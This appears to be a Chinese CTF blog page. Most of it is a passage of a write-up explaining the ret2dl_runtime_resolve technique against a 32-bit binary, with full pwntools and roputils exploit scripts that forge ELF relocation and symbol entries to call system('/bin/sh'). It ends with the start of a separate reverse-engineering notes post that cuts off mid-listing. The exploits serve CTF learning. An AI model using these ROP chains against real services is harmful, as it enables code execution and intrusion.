<p><strong>这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析</strong><br>我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    ELF32_Word      sh_name;</span><br><span class="line">    ELF32_Word      sh_type;</span><br><span class="line">    ELF32_Word      sh_flags;</span><br><span class="line">    ELF32_Addr      sh_addr;</span><br><span class="line">    ELF32_Off       sh_offset;</span><br><span class="line">    ELF32_Word      sh_size;</span><br><span class="line">    ELF32_Word      sh_link;</span><br><span class="line">    ELF32_Word      sh_info;</span><br><span class="line">    ELF32_Word      sh_addralign;</span><br><span class="line">    ELF32_Word      sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>成员</th>
<th>说明</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>sh_name</td>
<td>节名称，是节区头字符串表节区中（Section Header String Table Section）的索引，因此该字段实际是一个数值。在字符串表中的具体内容是以 NULL 结尾的字符串。</td>
<td></td>
</tr>
<tr>
<td>sh_type</td>
<td>根据节的内容和语义进行分类，具体的类型下面会介绍。</td>
<td></td>
</tr>
<tr>
<td>sh_flags</td>
<td>每一比特代表不同的标志，描述节是否可写，可执行，需要分配内存等属性。</td>
<td></td>
</tr>
<tr>
<td>sh_addr</td>
<td>如果节区将出现在进程的内存映像中，此成员给出节区的第一个字节应该在进程镜像中的位置。否则，此字段为 0。</td>
<td></td>
</tr>
<tr>
<td>sh_offset</td>
<td>给出节区的第一个字节与文件开始处之间的偏移。SHT_NOBITS 类型的节区不占用文件的空间，因此其 sh_offset</td>
<td>成员给出的是概念性的偏移。</td>
</tr>
<tr>
<td>sh_size</td>
<td>此成员给出节区的字节大小。除非节区的类型是 SHT_NOBITS ，否则该节占用文件中的 sh_size 字节。类型为SHT_NOBITS 的节区长度可能非零，不过却不占用文件中的空间。</td>
<td></td>
</tr>
<tr>
<td>sh_link</td>
<td>此成员给出节区头部表索引链接，其具体的解释依赖于节区类型。</td>
<td></td>
</tr>
<tr>
<td>sh_info</td>
<td>此成员给出附加信息，其解释依赖于节区类型。</td>
<td></td>
</tr>
<tr>
<td>sh_addralign</td>
<td>某些节区的地址需要对齐。例如，如果一个节区有一个 doubleword 类型的变量，那么系统必须保证整个节区按双字对齐。也就是说，$sh_addr % sh_addralign$=0。目前它仅允许为 0，以及 2 的正整数幂数。 0 和 1 表示没有对齐约束。</td>
<td></td>
</tr>
<tr>
<td>sh_entsize</td>
<td>某些节区中存在具有固定大小的表项的表，如符号表。对于这类节区，该成员给出每个表项的字节大小。反之，此成员取值为0。</td>
<td></td>
</tr>
</tbody></table>
<p>sh_addr就是取这个地址，取进程镜像中的地址</p>
<h3 id="接下来是重点了"><a href="#接下来是重点了" class="headerlink" title="接下来是重点了"></a>接下来是重点了</h3><ul>
<li>如果这部分不理解，你就。。。</li>
<li>其实还是可以做这道题的，因为这是原理部分内容，完全可以复制黏贴一把梭，不用理解</li>
<li>不过做题图个啥，不就是懂这个原理嘛，接下来仔细解释下如何构造</li>
</ul>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_sym_addr = base_stage + 32</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">#对齐</span><br></pre></td></tr></table></figure>

<p>接下来就是真正的构造部分了，我先构造dynsym内容的地址，我将base_stage + 32作为system函数的偏移地址，也就是说，我知道了dynstr的system地址了，<strong>但我这随便取的base_stage + 32 有可能相对于dynsym不是个标准地址</strong> 什么叫标准地址，他的每个结构体都是16个字节，也就是说他的地址都是对齐的，我可能相对于他不是刚好一个对齐的地址，所以我这里需要对齐一下，利用我对齐上面部分的代码就可以进行对齐了。解释下：<br>假设内存布局是这样的</p>
<p>0x8048a00 11111111 22222222 33333333 44444444 dynsym起始位置<br>0x8048a10 11111111 22222222 33333333 44444444<br>0x8048a20 11111111 22222222 33333333 44444444<br>0x8048a30 11111111 22222222 33333333 44444444<br>0x8048a40 11111111 22222222 33333333 44444444<br>0x8048a50 11111111 22222222 33333333 44444444<br>0x8048a60 11111111 22222222 33333333 44444444<br>0x8048a70 11111111 22222222 33333333 44444444<br>0x8048a80 11111111 22222222 33333333 44444444</p>
<p>我base_stage + 32可能在这4个部分的任意位置，但这样是不行的，他的结构体只能从开头开始，所以我需要取他的这段开头的地址</p>
<ul>
<li>假设我在第3部分，第一个3的位置，那我base_stage + 32就是0x8048a88</li>
<li>利用上面那个计算方式就是0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8</li>
<li>故我的地址在加上align后就变成0x8048a90刚好是对齐了</li>
</ul>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index_dynsym = (fake_sym_addr - dynsym)/0x10</span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">read_got = elf.got[&apos;setvbuf&apos;]</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">#构造.rel.plt表</span><br></pre></td></tr></table></figure>

<ul>
<li>然后利用这个对齐后的地址开始构造，我可以求出他在.rel.plt表中的偏移,别忘了，我当初说过的，这是相对偏移，所以我们要求r_info也是相对偏移，</li>
<li>先通过( fake_sym_addr - dynsym(基地址) )/0x10,求出偏移</li>
<li>然后再在这个地址后面添加上07标识，表示这个函数是导入函数，所以就变成了,左移8位就是增加一个字节，两位二进制位， |7相当于加7</li>
<li>然后我们需要一个地址进行写入，以后调用跳到这个表的函数就会直接去到函数的真实地址了，不过这里我们只需调用一次，不需要二次调用，所以地址可以随便写，当然，要可写的地址。。。我取了setvbuf的got表，然后将他做成个结构体</li>
<li>flat([])就是将里面的全变成字符</li>
</ul>
<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sys = flat([st_name, 0, 0, 0x12])</span><br></pre></td></tr></table></figure>

<ul>
<li>构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数</li>
<li>这里我将fake_sym_addr + 0x10作为’system\x00’的地址，然后求出相对偏移，然后将他构造成一个结构体</li>
</ul>
<h4 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index_offset = base_stage + 24 - rel_plt</span><br></pre></td></tr></table></figure>

<p>这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的<br>构造完后，我们需要构造ROP链了</p>
<h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看</p>
<h4 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">sh = &apos;/bin/sh&apos;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>初始化ROP链和参数</p>
<p>#### 第二部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br></pre></td></tr></table></figure>
</li>
<li><p>先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve</p>
</li>
<li><p>然后传入偏移,32位是用栈传参的，也就是这样</p>
</li>
<li><p>如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0</p>
</li>
</ul>
<h4 id="第三部分-1"><a href="#第三部分-1" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(base_stage+82)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>bbbb为返回地址</p>
</li>
<li><p>base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数</p>
<p>这里具体为什么是这里，你可以从gdb调试看出来，他里面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble _dl_runtime_resolve</span><br><span class="line">Dump of assembler code for function _dl_runtime_resolve:</span><br><span class="line">=&gt; 0xf7f7e6c0 &lt;+0&gt;: push   eax</span><br><span class="line"> 0xf7f7e6c1 &lt;+1&gt;: push   ecx</span><br><span class="line"> 0xf7f7e6c2 &lt;+2&gt;: push   edx</span><br><span class="line"> 0xf7f7e6c3 &lt;+3&gt;: mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line"> 0xf7f7e6c7 &lt;+7&gt;: mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line"> 0xf7f7e6cb &lt;+11&gt;:    call   0xf7f78ac0 &lt;_dl_fixup&gt;</span><br><span class="line"> 0xf7f7e6d0 &lt;+16&gt;:    pop    edx</span><br><span class="line"> 0xf7f7e6d1 &lt;+17&gt;:    mov    ecx,DWORD PTR [esp]</span><br><span class="line"> 0xf7f7e6d4 &lt;+20&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line"> 0xf7f7e6d7 &lt;+23&gt;:    mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line"> 0xf7f7e6db &lt;+27&gt;:    ret    0xc</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510172916-147155ac-7306-1.png" alt="img"></p>
</li>
<li><p>从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了<br>看参数<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190510173006-326e45d8-7306-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190510173006-326e45d8-7306-1.png" alt="img"></a></p>
</li>
<li><p>这里arg[0]就是返回地址，</p>
</li>
<li><p>arg[1]就是参数了</p>
</li>
<li><p>符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧</p>
</li>
</ul>
<h4 id="第四部分-1"><a href="#第四部分-1" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br></pre></td></tr></table></figure>

<ul>
<li>进行填充，使位置达到base_stage + 24</li>
</ul>
<h4 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(fake_sys_rel)</span><br></pre></td></tr></table></figure>

<ul>
<li>填入.rel.plt里的一个结构体，用于解析函数</li>
</ul>
<h4 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(align * &apos;a&apos;)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>填充对齐部分</p>
<p>#### 第七部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(fake_sys)</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里填入的是一个结构体，大小为0x10，fake_sys-&gt;st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了</p>
</li>
</ul>
<h4 id="第八部分"><a href="#第八部分" class="headerlink" title="第八部分"></a>第八部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;system\x00&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="第九部分"><a href="#第九部分" class="headerlink" title="第九部分"></a>第九部分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(&apos;a&apos;*(80 - len(rop.chain())))</span><br><span class="line">print len(rop.chain())</span><br></pre></td></tr></table></figure>

<ul>
<li><p>这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh</p>
<p>#### 第十部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(sh+&apos;\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(100 - len(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>完整构造就这样完成了，接下来直接打就能成功了。<br>先贴上完整exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">offset = 44</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">io = process(&apos;./pwn&apos;)</span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(&apos;a&apos;*offset)</span><br><span class="line">rop.read(0, base_stage, 100)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 32</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym)/0x10</span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sys = flat([st_name, 0, 0, 0x12])</span><br><span class="line">index_offset = base_stage + 24 - rel_plt</span><br><span class="line">read_got = elf.got[&apos;setvbuf&apos;]</span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">sh = &apos;/bin/sh&apos;</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(base_stage+82)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">rop.raw(fake_sys_rel)</span><br><span class="line">rop.raw(align * &apos;a&apos;)</span><br><span class="line">rop.raw(fake_sys)</span><br><span class="line">rop.raw(&apos;system\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(80 - len(rop.chain())))</span><br><span class="line">print len(rop.chain())</span><br><span class="line">rop.raw(sh+&apos;\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(100 - len(rop.chain())))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。</p>
<h2 id="通杀"><a href="#通杀" class="headerlink" title="通杀"></a>通杀</h2><ul>
<li>其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路</li>
<li>其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime</li>
<li>理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了<br><strong>接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">processName = &apos;pwn&apos;</span><br><span class="line">offset = 44</span><br><span class="line"></span><br><span class="line">r = process(&apos;./&apos; + processName)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">rop = ROP(&apos;./&apos; + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul>
<li>以后遇到高级ROP这种题就一把梭了</li>
<li>妈妈在也不用担心我遇到栈的这种问题了</li>
<li>我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/CG-CTF─╧╙╩RE─µ╧≥╠Γ▒╩╝╟/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/14/CG-CTF─╧╙╩RE─µ╧≥╠Γ▒╩╝╟/" class="post-title-link" itemprop="url">CG-CTF南邮RE逆向题笔记</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-14 09:15:59" itemprop="dateCreated datePublished" datetime="2019-09-14T09:15:59-07:00">2019-09-14</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-15 00:16:20" itemprop="dateModified" datetime="2019-09-15T00:16:20-07:00">2019-09-15</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="1-Hello，RE！"><a href="#1-Hello，RE！" class="headerlink" title="1.Hello，RE！"></a>1.Hello，RE！</h3><p>没什么好讲的，签到题，把获得的题目文件 1.exe 直接拖进IDA Pro即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public _main</span><br><span class="line">_main proc near</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">sub     esp, 90h</span><br><span class="line">call    ___main</span><br><span class="line">mov     dword ptr [esp], 410000h ; char *</span><br><span class="line">call    __Z6printfPKcz  ; printf(char const*,...)</span><br><span class="line">mov     dword ptr [esp+75h], 67616C66h</span><br><span class="line">mov     dword ptr [esp+79h], 6C65577Bh</span><br><span class="line">mov     dword ptr [esp+7Dh], 656D6F63h</span><br><span class="line">mov     dword ptr [esp+81h], 5F6F545Fh</span><br><span class="line">mov     dword ptr [esp+85h], 575F4552h</span><br><span class="line">mov     dword ptr [esp+89h], 646C726Fh</span><br><span class="line">mov     word ptr [esp+8Dh], 7D21h</span><br><span class="line">mov     byte ptr [esp+8Fh], 0</span><br><span class="line">jmp     short loc_401592</span><br></pre></td></tr></table></figure>

<p>有个 strcmp 函数，比较 v4 和 v5 地址的。选中 v5 ，发现倒序的 flag 字样。</p>
<p>按R即可获得Flag：flag{Welcome_To_RE_World!}</p>
<h3 id="2-ReadAsm2"><a href="#2-ReadAsm2" class="headerlink" title="2.ReadAsm2"></a>2.ReadAsm2</h3><p>单纯的汇编语言考察题目，题目有两段汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[] = &#123;<span class="number">0x0</span>,  <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>,</span><br><span class="line">                  <span class="number">0x55</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>,</span><br><span class="line">                  <span class="number">0x71</span>, <span class="number">0x4a</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x66</span> , <span class="number">0x1c</span>&#125;;</span><br><span class="line">  func(input, <span class="number">28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,input+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开题目文件 2.asm 可获得第二段 func函数 汇编代码</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004004e6</span> &lt;func&gt;:<span class="type"></span></span><br><span class="line"><span class="type">  4004e6</span>: <span class="number">55</span>                    push   rbp</span><br><span class="line">  <span class="number">4004e7</span>: <span class="type">48 89 e5              mov    rbp</span>,rsp</span><br><span class="line">  <span class="number">4004</span>ea: <span class="type">48 89 7d e8           mov    QWORD PTR </span>[rbp<span class="number">-0x18</span>],rdi</span><br><span class="line">  <span class="number">4004</span>ee: <span class="type">89 75 e4              mov    DWORD PTR </span>[rbp<span class="number">-0x1c</span>],esi</span><br><span class="line">  <span class="number">4004</span>f1: <span class="type">c7 45 fc 01 00 00 00  mov    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span></span><br><span class="line">  <span class="number">4004</span>f8: <span class="type">eb 28                 jmp    400522 </span>&lt;func+<span class="number">0x3c</span>&gt;</span><br><span class="line">  <span class="number">4004</span>fa: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">4004</span>fd: <span class="type">48 63 d0              movsxd rdx</span>,eax</span><br><span class="line">  <span class="number">400500</span>: <span class="type">48 8b 45 e8           mov    rax</span>,QWORD PTR [rbp<span class="number">-0x18</span>]</span><br><span class="line">  <span class="number">400504</span>: <span class="type">48 01 d0              add    rax</span>,rdx</span><br><span class="line">  <span class="number">400507</span>: <span class="type">8b 55 fc              mov    